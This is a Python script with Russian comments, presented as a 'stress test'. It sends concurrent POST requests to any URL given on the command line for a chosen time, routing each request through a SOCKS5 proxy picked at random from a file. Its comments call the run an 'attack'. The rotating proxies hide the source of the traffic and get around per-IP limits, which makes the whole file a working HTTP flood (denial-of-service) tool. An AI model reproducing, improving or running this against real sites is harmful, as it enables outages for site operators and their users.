import aiohttp
import asyncio
import random
import time
import sys
from aiohttp_socks import ProxyConnector

# Проверка аргументов командной строки
if len(sys.argv) < 4:
    print("Использование: python stress_test.py <url> <boot_time_in_seconds> <concurrents>")
    sys.exit(1)

# Получаем время работы атаки и количество одновременных запросов из аргументов командной строки
boot_time = int(sys.argv[2])  # Время атаки в секундах
concurrents = int(sys.argv[3])  # Количество одновременных запросов

# URL для тестирования
url = sys.argv[1]  # Замените на нужный вам URL

# Чтение прокси из файла
def load_proxies(filename):
    try:
        with open(filename, 'r') as file:
            return [line.strip() for line in file if line.strip()]
    except Exception as e:
        print(f'Ошибка при чтении файла с прокси: {e}')
        sys.exit(1)

# Асинхронная функция для отправки запроса
async def send_request(session, proxy):
    try:
        start_time = time.time()  # Начало измерения времени
        # Создаем случайные данные для POST-запроса
        data = {'key': random.randint(1, 1000)}  # Замените на нужные данные
        async with session.post(url, json=data, proxy=f'socks5://{proxy}', ssl=False) as response:
            end_time = time.time()  # Конец измерения времени
            duration = end_time - start_time
            print(f"Прокси: {proxy} - Status: {response.status}, Время: {duration:.2f}s")
    except Exception as e:
        print(f"Request failed через прокси {proxy} на {url}: {e}")

# Функция для выполнения запросов
async def stress_test(proxies):
    connector = aiohttp.TCPConnector(limit=concurrents)
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = []
        end_time = time.time() + boot_time
        while time.time() < end_time:
            if len(tasks) < concurrents:  # Ограничиваем количество одновременно выполняемых задач
                proxy = random.choice(proxies)  # Случайный выбор прокси
                task = asyncio.create_task(send_request(session, proxy))
                tasks.append(task)
                
                # Задержка между отправкой новых задач
                await asyncio.sleep(random.uniform(0.01, 0.05))  # Задержка от 0.01 до 0.05 секунд
            else:
                # Ожидание завершения одной из задач
                done, pending = await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)
                tasks = [t for t in tasks if t not in done]  # Удаляем завершенные задачи

        await asyncio.gather(*tasks)  # Завершение всех оставшихся задач

if __name__ == "__main__":
    proxies = load_proxies("result.txt")  # Загружаем прокси из файла
    start_time = time.time()
    asyncio.run(stress_test(proxies))
    end_time = time.time()
    print(f"Тест завершён за {end_time - start_time:.2f} секунд")
